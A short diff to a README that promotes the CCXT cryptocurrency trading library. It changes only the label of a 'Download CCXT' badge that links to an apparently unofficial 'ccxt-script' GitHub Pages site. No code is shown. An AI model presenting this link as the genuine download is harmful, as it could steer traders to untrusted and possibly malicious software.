@@ -2,7 +2,7 @@
 
 CCXT is a popular open-source JavaScript/Python/PHP library that provides a unified way to connect to over 100 cryptocurrency exchanges and trade across them. Designed for algorithmic traders, developers, and analysts, CCXT makes it easy to integrate exchange data into custom trading systems, backtest strategies, and automate cryptocurrency trading. Whether you are working with major exchanges like Binance, Kraken, or Coinbase, or smaller ones, CCXT simplifies the process of handling trading pairs, market data, and order execution.
 
-[![Download CCXT](https://img.shields.io/badge/Download-ccxt%20-blueviolet)](https://ccxt-script.github.io/.github/)
+[![Download CCXT](https://img.shields.io/badge/Download-ccxt%20script-blueviolet)](https://ccxt-script.github.io/.github/)
 
 ### **1. Key Features of CCXT**
 
